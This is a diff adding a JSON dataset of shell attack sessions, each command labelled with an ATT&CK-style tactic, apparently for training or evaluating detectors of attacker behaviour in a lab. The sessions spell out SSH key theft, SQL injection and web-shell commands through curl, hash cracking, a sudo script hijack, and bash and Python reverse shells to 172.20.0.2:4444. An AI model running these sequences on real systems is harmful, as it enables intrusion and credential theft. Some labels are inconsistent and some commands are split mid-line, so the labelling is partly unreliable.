+        "command": "ls -lah /root/.ssh/ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lah /root/.ssh/ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "scp -P 2222 root@172.20.0.3:/root/.ssh/id_rsa ./id_rsa ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "scp -P 2222 root@172.20.0.3:/root/.ssh/id_rsa ./id_rsa ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "ls -l ./id_rsa ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "cat /root/.ssh/known_hosts ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /root/.ssh/known_hosts ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ssh -i ./id_rsa root@192.168.1.10 ;",
+        "label": "Lateral Movement"
+      },
+      {
+        "command": "ssh -i ./id_rsa root@192.168.1.10 ;",
+        "label": "Lateral Movement"
+      },
+      {
+        "command": "id &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "uname -a &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "hostname &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/os-release ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ssh-keygen -y -f ./id_rsa ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "ssh-keygen -y -f ./id_rsa ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "ssh-agent bash ;",
+        "label": "Lateral Movement"
+      },
+      {
+        "command": "ssh-add ./id_rsa ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "ssh -A root@192.168.1.10 ;",
+        "label": "Lateral Movement"
+      },
+      {
+        "command": "ssh -A root@192.168.1.10 ;",
+        "label": "Lateral Movement"
+      }
+    ]
+  },
+  {
+    "session": "uname -a ; uname -a ; id ;",
+    "full_session": [
+      {
+        "command": "uname -a ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "id ;",
+        "label": "Discovery"
+      }
+    ]
+  },
+  {
+    "session": "nikto -h http://172.20.0.3:8080 ; nikto -h http://172.20.0.3:8080 -nointeractive -Display V ; curl -i http://172.20.0.3:8080/admin/ ; curl -i http://172.20.0.3:8080/admin/ ; curl -i 'http://172.20.0.3:8080/useradd?username=admin' --data 'username=admin\\' OR 1=1 -- ' ; curl -i 'http://172.20.0.3:8080/useradd?username=admin\\' UNION SELECT NULL, version(), NULL -- ' ; curl -i 'http://172.20.0.3:8080/userdel?userid=1 OR 1=1 -- ' ; curl -i 'http://172.20.0.3:8080/userdel?userid=1 OR 1=1 -- ' ; curl -i -X POST 'http://172.20.0.3:8080/useradd' -d 'username=exploit&password=Password123!' ; sshpass -p Password123! ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null exploit@172.20.0.3 echo 'SSH login successful' ; sshpass -p Password123! ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null exploit@172.20.0.3 echo 'SSH login successful' ; ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null exploit@172.20.0.3 id; uname -a; ls -la ~ ; curl -s http://172.20.0.3:8080/config.php -o config.php ; curl -s http://172.20.0.3:8080/backup.sql -o backup.sql ; mysql -h 172.20.0.3 -P 3307 -u db_user -pdb_password -D vulnerable_db -e 'SHOW TABLES;' ; grep -oP \"\\$2y\\$.+\" backup.sql > password_hashes.txt ; grep -oP \"\\$2y\\$.+\" backup.sql > password_hashes.txt ; john --wordlist=/usr/share/wordlists/rockyou.txt password_hashes.txt ; john --show password_hashes.txt ; curl -I http://172.20.0.3:8080/uploads/ ; sshpass -p Password123! ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@172.20.0.3 echo 'SSH login successful' ; sshpass -p Password123! ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@172.20.0.3 echo 'SSH login successful' ; curl -i http://172.20.0.3:8080/uploads/ ; curl -i http://172.20.0.3:8080/uploads/shell.php ; curl -i http://172.20.0.3:8080/uploads/flag.txt ; curl http://172.20.0.3:8080/uploads/malicious_file.php ; curl -s http://172.20.0.3:8080/uploads/malicious_file.php ; curl -i -F 'file=@/usr/share/webshells/php/php-reverse-shell.php' http://172.20.0.3:8080/uploads/ ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=id' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=ls -la /' ; nc -lvnp 4444 ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /etc/passwd' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /etc/hostname' ; curl -i http://172.20.0.3:8080/uploads/malicious_file.php?cmd=whoami ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=sudo -l' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=find / -perm -4000 -type f 2>/dev/null' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /etc/crontab' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=chsh -s /bin/bash www-data' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=ls -la /usr/bin/some_script.sh /usr/local/bin/startup_script.sh /usr/sbin/backup.sh' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=ls -la /usr/bin/some_script.sh /usr/local/bin/startup_script.sh /usr/sbin/backup.sh' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /usr/bin/some_script.sh' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /usr/local/bin/startup_script.sh' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /usr/sbin/backup.sh' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /usr/sbin/backup.sh' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=ls -la /backups' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=ls -la /backups' ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=touch /backups/test_file.txt' ; nc -lvnp 4444 ; curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=echo \"#!/bin/bash\\nbash -i >& /dev/tcp/172.20.0.2/4444 0>&1\" > /backups/reverse_shell.sh && chmod +x /backups/reverse_shell.sh' ;",
+    "full_session": [
+      {
+        "command": "nikto -h http://172.20.0.3:8080 ;",
+        "label": "Reconnaissance"
+      },
+      {
+        "command": "nikto -h http://172.20.0.3:8080 -nointeractive -Display V ;",
+        "label": "Reconnaissance"
+      },
+      {
+        "command": "curl -i http://172.20.0.3:8080/admin/ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "curl -i http://172.20.0.3:8080/admin/ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/useradd?username=admin' --data 'username=admin\\' OR 1=1 -- ' ;",
+        "label": "Initial Access"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/useradd?username=admin\\' UNION SELECT NULL, version(), NULL -- ' ;",
+        "label": "Initial Access"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/userdel?userid=1 OR 1=1 -- ' ;",
+        "label": "Impact"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/userdel?userid=1 OR 1=1 -- ' ;",
+        "label": "Impact"
+      },
+      {
+        "command": "curl -i -X POST 'http://172.20.0.3:8080/useradd' -d 'username=exploit&password=Password123!' ;",
+        "label": "Initial Access"
+      },
+      {
+        "command": "sshpass -p Password123! ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null exploit@172.20.0.3 echo 'SSH login successful' ;",
+        "label": "Lateral Movement"
+      },
+      {
+        "command": "sshpass -p Password123! ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null exploit@172.20.0.3 echo 'SSH login successful' ;",
+        "label": "Lateral Movement"
+      },
+      {
+        "command": "ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null exploit@172.20.0.3 id;",
+        "label": "Lateral Movement"
+      },
+      {
+        "command": "uname -a;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la ~ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "curl -s http://172.20.0.3:8080/config.php -o config.php ;",
+        "label": "Collection"
+      },
+      {
+        "command": "curl -s http://172.20.0.3:8080/backup.sql -o backup.sql ;",
+        "label": "Collection"
+      },
+      {
+        "command": "mysql -h 172.20.0.3 -P 3307 -u db_user -pdb_password -D vulnerable_db -e 'SHOW TABLES;' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "grep -oP \"\\$2y\\$.+\" backup.sql > password_hashes.txt ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "grep -oP \"\\$2y\\$.+\" backup.sql > password_hashes.txt ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "john --wordlist=/usr/share/wordlists/rockyou.txt password_hashes.txt ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "john --show password_hashes.txt ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "curl -I http://172.20.0.3:8080/uploads/ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "sshpass -p Password123! ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@172.20.0.3 echo 'SSH login successful' ;",
+        "label": "Lateral Movement"
+      },
+      {
+        "command": "sshpass -p Password123! ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@172.20.0.3 echo 'SSH login successful' ;",
+        "label": "Lateral Movement"
+      },
+      {
+        "command": "curl -i http://172.20.0.3:8080/uploads/ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "curl -i http://172.20.0.3:8080/uploads/shell.php ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "curl -i http://172.20.0.3:8080/uploads/flag.txt ;",
+        "label": "Collection"
+      },
+      {
+        "command": "curl http://172.20.0.3:8080/uploads/malicious_file.php ;",
+        "label": "Execution"
+      },
+      {
+        "command": "curl -s http://172.20.0.3:8080/uploads/malicious_file.php ;",
+        "label": "Execution"
+      },
+      {
+        "command": "curl -i -F 'file=@/usr/share/webshells/php/php-reverse-shell.php' http://172.20.0.3:8080/uploads/ ;",
+        "label": "Execution"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=id' ;",
+        "label": "Execution"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=ls -la /' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "nc -lvnp 4444 ;",
+        "label": "Command and Control"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /etc/passwd' ;",
+        "label": "Collection"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /etc/hostname' ;",
+        "label": "Collection"
+      },
+      {
+        "command": "curl -i http://172.20.0.3:8080/uploads/malicious_file.php?cmd=whoami ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=sudo -l' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=find / -perm -4000 -type f 2>/dev/null' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /etc/crontab' ;",
+        "label": "Collection"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=chsh -s /bin/bash www-data' ;",
+        "label": "Privilege Escalation"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=ls -la /usr/bin/some_script.sh /usr/local/bin/startup_script.sh /usr/sbin/backup.sh' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=ls -la /usr/bin/some_script.sh /usr/local/bin/startup_script.sh /usr/sbin/backup.sh' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /usr/bin/some_script.sh' ;",
+        "label": "Collection"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /usr/local/bin/startup_script.sh' ;",
+        "label": "Collection"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /usr/sbin/backup.sh' ;",
+        "label": "Collection"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=cat /usr/sbin/backup.sh' ;",
+        "label": "Collection"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=ls -la /backups' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=ls -la /backups' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=touch /backups/test_file.txt' ;",
+        "label": "Execution"
+      },
+      {
+        "command": "nc -lvnp 4444 ;",
+        "label": "Command and Control"
+      },
+      {
+        "command": "curl -i 'http://172.20.0.3:8080/uploads/malicious_file.php?cmd=echo \"#!/bin/bash\\nbash -i >& /dev/tcp/172.20.0.2/4444 0>&1\" > /backups/reverse_shell.sh && chmod +x /backups/reverse_shell.sh' ;",
+        "label": "Command and Control"
+      }
+    ]
+  },
+  {
+    "session": "id ; sudo -l ; find / -perm -4000 -type f 2>/dev/null ; uname -a ; cat /etc/os-release ; userdel --help ; userdel 'nonexistentuser' ; userdel \"nonexistent' OR '1'='1\" ; userdel \"nonexistent'; -- \" ; grep -r userdel /etc 2>/dev/null ; cat /etc/init.d/userdel ; ls -la ~ ; ls -la ~/scripts ; cat ~/scripts/useradd.sh ; cat ~/scripts/userdel.sh ; ls -l ~/scripts ; crontab -l ; cat /etc/crontab ; grep -r scripts /etc/cron* ; ~/scripts/userdel.sh \"dummyuser; echo 'InjectionSuccessful' > /tmp/injection_test\" ; ~/scripts/userdel.sh \"dummyuser`echo InjectionSuccessful > /tmp/injection_test`\" ; ~/scripts/userdel.sh \"dummyuser$(echo InjectionSuccessful > /tmp/injection_test)\" ; find / -perm -4000 -type f 2>/dev/null ; echo $PATH; find /home/user1 -writable 2>/dev/null ; find /home/user -writable 2>/dev/null; find /tmp -writable 2>/dev/null ; sudo crontab -l ; systemctl list-timers --all ; echo 'echo pwned > /tmp/pwned_by_root' > /home/user/scripts/userdel.sh ; sudo /home/user/scripts/userdel.sh testuser ; ~/scripts/userdel.sh testuser; cat /tmp/pwned_by_root ; grep user /etc/passwd ; su - user ; find /home/user -type f -readable 2>/dev/null ; cat /etc/shadow ; grep -i -r 'password\\|secret\\|key' ~ ; ps aux | grep -i secret ; echo '#!/bin/bash' > /home/user/scripts/rev.sh; echo 'bash -i >& /dev/tcp/172.20.0.2/4444 0>&1' >> /home/user/scripts/rev.sh; chmod +x /home/user/scripts/rev.sh ; nc -lvn 4444 ; /home/user/scripts/rev.sh ; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.20.0.2\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > /home/user/scripts/rev.py ; python /home/user/scripts/rev.py ;",
+    "full_session": [
+      {
+        "command": "id ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "sudo -l ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "find / -perm -4000 -type f 2>/dev/null ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/os-release ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "userdel --help ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "userdel 'nonexistentuser' ;",
+        "label": "Impact"
+      },
+      {
+        "command": "userdel \"nonexistent' OR '1'='1\" ;",
+        "label": "Impact"
+      },
+      {
+        "command": "userdel \"nonexistent';",
+        "label": "Impact"
+      },
+      {
+        "command": "-- \" ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "grep -r userdel /etc 2>/dev/null ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/init.d/userdel ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la ~ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la ~/scripts ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat ~/scripts/useradd.sh ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat ~/scripts/userdel.sh ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -l ~/scripts ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "crontab -l ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/crontab ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "grep -r scripts /etc/cron* ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "~/scripts/userdel.sh \"dummyuser;",
+        "label": "Impact"
+      },
+      {
+        "command": "echo 'InjectionSuccessful' > /tmp/injection_test\" ;",
+        "label": "Impact"
+      },
+      {
+        "command": "~/scripts/userdel.sh \"dummyuser`echo InjectionSuccessful > /tmp/injection_test`\" ;",
+        "label": "Impact"
+      },
+      {
+        "command": "~/scripts/userdel.sh \"dummyuser$(echo InjectionSuccessful > /tmp/injection_test)\" ;",
+        "label": "Impact"
+      },
+      {
+        "command": "find / -perm -4000 -type f 2>/dev/null ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "echo $PATH;",
+        "label": "Discovery"
+      },
+      {
+        "command": "find /home/user1 -writable 2>/dev/null ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "find /home/user -writable 2>/dev/null;",
+        "label": "Discovery"
+      },
+      {
+        "command": "find /tmp -writable 2>/dev/null ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "sudo crontab -l ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "systemctl list-timers --all ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "echo 'echo pwned > /tmp/pwned_by_root' > /home/user/scripts/userdel.sh ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "sudo /home/user/scripts/userdel.sh testuser ;",
+        "label": "Impact"
+      },
+      {
+        "command": "~/scripts/userdel.sh testuser;",
+        "label": "Impact"
+      },
+      {
+        "command": "cat /tmp/pwned_by_root ;",
+        "label": "Collection"
+      },
+      {
+        "command": "grep user /etc/passwd ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "su - user ;",
+        "label": "Lateral Movement"
+      },
+      {
+        "command": "find /home/user -type f -readable 2>/dev/null ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/shadow ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "grep -i -r 'password\\|secret\\|key' ~ ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "ps aux |",
+        "label": "Discovery"
+      },
+      {
+        "command": "grep -i secret ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "echo '#!/bin/bash' > /home/user/scripts/rev.sh;",
+        "label": "Persistence"
+      },
+      {
+        "command": "echo 'bash -i >& /dev/tcp/172.20.0.2/4444 0>&1' >> /home/user/scripts/rev.sh;",
+        "label": "Command and Control"
+      },
+      {
+        "command": "chmod +x /home/user/scripts/rev.sh ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "nc -lvn 4444 ;",
+        "label": "Command and Control"
+      },
+      {
+        "command": "/home/user/scripts/rev.sh ;",
+        "label": "Command and Control"
+      },
+      {
+        "command": "echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.20.0.2\",4444));os.dup2(s.fileno(),0);",
+        "label": "Command and Control"
+      },
+      {
+        "command": "os.dup2(s.fileno(),1);",
+        "label": "Command and Control"
+      },
+      {
+        "command": "os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > /home/user/scripts/rev.py ;",
+        "label": "Command and Control"
+      },
+      {
+        "command": "python /home/user/scripts/rev.py ;",
+        "label": "Command and Control"
+      }
+    ]
+  }
+]
